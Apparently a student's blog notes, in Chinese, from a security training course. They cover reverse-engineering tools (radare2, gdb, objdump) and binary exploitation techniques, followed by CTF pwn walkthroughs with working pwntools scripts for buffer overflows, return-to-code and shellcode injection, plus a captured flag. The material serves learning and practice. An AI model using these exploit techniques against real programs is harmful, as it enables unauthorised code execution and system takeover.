---
layout: post
title: 人才培育計畫課程筆記
author: jerry chen
tags:
- 管理
date: 2023-08-24 04:08  
---


# 程式安全
## nc使用&ncat(連線遠端主機)
- -z 只進行掃描,不進行任何的資料傳送，-v 顯示掃瞄訊息， -n 不進行 DNS 查詢
- nc [遠端主機]
- ncat -vc ./[檔案] -kl [架設的主機位置(如本地localhost 172.0.0.1 port)]
- nc localhost port
## objdump(列出執行檔中的組合語言)
- objdump -M intel -d ./[檔案]
- /main 尋找主程式 
- n 尋找下一個 
> 條件執行多條命令，使用&&(前一個命令執行成功，即$?=0時，執行下一條命令，否則不執行)和||(前一個命令執行失敗，既$? ≠0時，執行下一條命令)`cmd1 &&cmd2|| cmd3`
## radare2(多用靜態分析，動態也可以)
- r2 
    - r2 ./[檔案] 
    - 開始逆向
- ? 
    - 可以去找如何使用
- [] 
    - 指令列前的[]中是想目前位置
- s [位址] 
    - 移動到其他位置
- aa 
    - analyze(分析)All
- aaa 深度分析
- afl 列出所有函式
- afn [改完的函數名稱] [改完的函數名稱] 改函式名稱(分析時可以把知道的函數意義筆記起來)
- afvn [改完的區域變數名稱] [原本的區域變數名稱] 改區域變數名稱(分析時可以把知道的區域變數功能筆記起來)
- pd [數字] 印出從當前位置往下n行的組合語言
- pdf 印出當前位置的函式
- q 退出
- CLI Mode(命令介面) & Hex Mode(16進制表示) & Visual Mode(可視化圖形界面)切換方式
    - CLI >> 按V >> Hex >> 按V >> Visual
    - CLI << 按q << Hex << 按q << Visual
- : 在Visual Mode使用CLI(命令列介面)


## gdb(動態分析，追蹤程式流程)
- gdb ./[檔案]
- q 退出 
- b main 設斷點在主程式 
- b *01234aa 設斷點在位址上 
- r 執行
- C 繼續(往下一個端點)
- ni 下一行指令
    - 不進入 call function ,直接到同一區塊的下個指令 
- si 下個執行的指令
    - 會進入 call function
    - fin 從 call function 中回到外面的下一行指令
- j *01234aa 跳到某個位址(不常用到，因對遠端只能做輸入或輸出)
- x/[數量][方法] *01234aa
    -gi 以指令(instruction)方法顯示
    -gs 以字串方法顯示
- checksec ./[檔案] 查看程式安全性保護
- vmmap 查看記憶體分佈，以及rwx權限設定 
    - 先設 b rain 以及 r 後 才做 vmmap
## pwntools
- 使用vim中建立方便連接遠端的程式
```python=
    from pwn import *
    
    r = remote([網址],[port])
    
    #遇到?就停下來
    s = r.recvuntil('?')
    
    print('$'+s+'$')
    
    #把abcd當輸入進去
    r = sendline('abcd')
    
    #交互模式
    r.interactive()
```
- python [vim檔].py
## vim(文字編輯器)
- i 輸入
- 退出
    - 按一次ESC鍵
        - :wq 保存並退出
        - :q! 放棄並退出 

## readelf(分析elf/library的工具)
- readelf -a [位置] | less
- 搭配 grep
    - grep 'printf' 找 printf 的 function

hexdump -C secret
https://albert-notes.github.io/2021/06/06/myfirstctf-2021/

## ELF的Lazy binding(第一次使用才會記錄下來)
- GOT Hijacking
    - 透過改寫GOT，使得呼叫該函式時，跳到指定位置
    - 不能是Full RELRO(因為其他地方無法寫入)
- bof-ret2libc
    - readelf -a [檔案] less 查看檔案中function的位置
    - 需找到libc base
        >readelf -a [檔案] 
## ROT(Return Oriented Programming)(串接Gadget達到控制)
- Gadget:程式碼片段是有return(ret)
- `ROPgadget -binary r3t2lib | grep '[想尋找的]'`
- 串好syscall後使用串好的達成指定需求

## Format String(printf使用上的漏洞)
- pritf參數小技巧
    - `%n$p` 指定第n個參數
    - 從第六個開始是flag的內容
    - `%n` 可以做寫入(通常用%hn或%hhn)
    - `%c` 指定%n寫入大小 
- Argv Chain
    - 無法直接將位址寫在stack上時會用到
    - 任意寫入
    - 任意讀取 
## Stark Migration
- 當可輸入的ROP chain長度不足時會使用
- 核心概念是將ROP chain寫在其他位置，透過動stack來執行
- Solution(解決方法)
    - 直接放one gadget
    - 跳到其他function
    - 用stack migration創造新空間(較難)
- ret其實前面都會有一個leave
- 如何找buffer
    - 在gdb中用vmmap找
- Simple Migration
-  Fiwed Size Migration
    -  不能控制輸入長度時使用
    -  直接用原本的read(main_read)進行輸入
    -  輸入的ROP長度為payload的長度
---
# 題目撰寫
## Buffover Overflow


### 張元_Pwn-1(Bof-local-variable)
#### 先進到Hello Hacker
- r2 ./[檔案libc的位置] | grep puts
- aa
- afl(可看到main function)
- s main
- vv(從綠色的call function開始看)
- vim [py檔]
```python=
from pwn import *

r = remote([ip位置],[port])
#or
#r = process('./[檔案]')

recvuntil('\n')
recvuntil('\n')

#停止動作(可以用來觀察)(實操不需要)
raw_input()

#12是需要填入多少個
#0xfaceb00c是文字，用p32轉字節串
#b'a'是將字串換成是字節串(同類型才能加)
r.sendline(b'a'*12 + p32(0xfaceb00c) + p32(0xdeadbeef) )

r.interactive()
```
- python3 exploit_luck.py
>BreakALLCTF{apFGcJ7XRCfXhsdu5VZl}
#### 再到最後的區塊分析
- s 0x400a93(會看到%d，代表要讀一個整數)
- s main
---
## ret2code
- 三種方法
    - Shell
    `% objdump -M intel -d test | less`
    - gdb
    `gdb-peda$ p shell`
    - r2
    `[0x000005d0]> afl~shell`(~shell是尋找有寫到shell的)
### 章元 pwn 8
#### 先看看有無奇怪function
- r2 ./[檔案]
- aa
- afl
- s 0x004006b6(奇怪的function)
- vv
- s 0x4007c8(上一步function裡所用的類型)(發現是sh類型)
- s main
- gdb ./[檔案]
- b main
- r
- ni(走到call的位置)
- 可以用python先記錄下來
- vim ./[py檔案]
```python=
from pwn import *

r = remote('[ip位置],[port]')

r.recvuntil('\n')
r.sendline(b'a'*0x38 + p64(0x004006b6))

r.interactive()
```
- python3 exploit_luck.py
---
### 章元 pwn 9
- r2 ./[檔案]
- aa
- afl
- s main
- vv
- gdb ./[檔案]
- b main 
- r
- vmmap
- vim ./[檔案]
```python=
from pwn import *

r = remote('[ip位置],[port]')

#Exploit Database:https://www.exploit-db.com/shellcodes
shellcode = '[在Exploit Database Shellcodes裡面找到可用字串]'

r.recvuntil(':')
r.sendline(shellcode)

r.recvuntil(':')
r.sendline(b'a'*0x28 + p64(0x601080))

r.interactive()
```
- python3 exploit_luck.py
---

### Programmer's Party
- ln -s ./ezreverse ./ezreverse.lnk 製造連結
    - ln:建立
    - S:捷徑
